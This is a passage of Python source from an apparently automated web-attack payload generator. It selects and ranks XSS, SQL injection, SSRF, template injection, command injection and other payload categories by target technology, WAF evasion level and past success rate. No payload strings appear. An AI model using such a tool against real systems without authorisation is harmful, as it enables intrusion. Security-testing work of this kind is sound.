    def payloads_for_tech_stack(
        self, technologies: list[str], waf: str | None = None,
    ) -> dict[str, list[str]]:
        """Return {category: [payloads]} ordered by relevance to the tech."""
        priority_cats: list[str] = []
        for tech in technologies:
            tech_lower = tech.lower()
            for key, cats in TECH_PAYLOAD_MAP.items():
                if key in tech_lower:
                    for c in cats:
                        if c not in priority_cats:
                            priority_cats.append(c)
                    break
        if not priority_cats:
            priority_cats = ["xss", "sqli", "ssrf", "ssti"]
        result: dict[str, list[str]] = {}
        for cat in priority_cats:
            result[cat] = self.generate(cat, waf=waf, mutation_level=3)
        return result

    # ===============================================================
    #  LEARNING ENGINE INTEGRATION
    # ===============================================================

    def get_ranked_payloads(
        self,
        category: VulnCategory,
        learning_engine: Any = None,
        **kwargs: Any,
    ) -> list[str]:
        """Payloads ranked by historical effectiveness (if learning data exists)."""
        standard = self.get_payloads(category, **kwargs)
        if learning_engine is None:
            return standard
        try:
            effectiveness = learning_engine.get_payload_effectiveness(category)
            if not effectiveness:
                return standard
            score_map = {e["payload"]: e["success_count"] for e in effectiveness}
            proven = sorted(
                [p for p in standard if p in score_map],
                key=lambda p: score_map.get(p, 0), reverse=True,
            )
            unproven = [p for p in standard if p not in score_map]
            return proven + unproven
        except Exception as exc:
            logger.debug(f"Payload ranking failed: {exc}")
            return standard

    # ===============================================================
    #  UNIFIED API
    # ===============================================================

    def get_payloads(self, category: VulnCategory, **kwargs: Any) -> list[str]:
        generators = {
            VulnCategory.XSS: self.generate_xss_payloads,
            VulnCategory.SQLI: self.generate_sqli_payloads,
            VulnCategory.SSRF: self.generate_ssrf_payloads,
            VulnCategory.IDOR: self.generate_idor_payloads,
            VulnCategory.COMMAND_INJECTION: self.generate_cmdi_payloads,
            VulnCategory.PATH_TRAVERSAL: self.generate_path_traversal_payloads,
            VulnCategory.OPEN_REDIRECT: self.generate_open_redirect_payloads,
            VulnCategory.JWT: self.generate_jwt_payloads,
        }
        gen = generators.get(category)
        return gen(**kwargs) if gen else []

    def generate(
        self, category: str, context: str = "html",
        waf: str | None = None, mutation_level: int = 3,
    ) -> list[str]:
        """Unified entry point.  Accepts string category names."""
        cat_lower = category.lower()
        dispatch: dict[str, Any] = {
            "xss": lambda: self.generate_xss_payloads(context=context, waf=waf, mutation_level=mutation_level),
            "sqli": lambda: self.generate_sqli_payloads(waf=waf),
            "ssrf": lambda: self.generate_ssrf_payloads(),
            "ssti": lambda: self._ssti_payloads(),
            "idor": lambda: self.generate_idor_payloads(),
            "command_injection": lambda: self.generate_cmdi_payloads(),
            "cmdi": lambda: self.generate_cmdi_payloads(),
            "path_traversal": lambda: self.generate_path_traversal_payloads(),
            "lfi": lambda: self.generate_path_traversal_payloads(),
            "open_redirect": lambda: self.generate_open_redirect_payloads(),
            "redirect": lambda: self.generate_open_redirect_payloads(),
            "jwt": lambda: self.generate_jwt_payloads(),
            "polyglot": lambda: self.generate_polyglot_payloads(),
        }
        gen = dispatch.get(cat_lower)
        return gen() if gen else []

    def generate_payloads(
        self, category: str, context: str = "html",
        waf: str | None = None, mutation_level: int = 3,
    ) -> list[str]:
        """Alias for generate() — used by engine_bridge.py."""
        return self.generate(category=category, context=context, waf=waf, mutation_level=mutation_level)
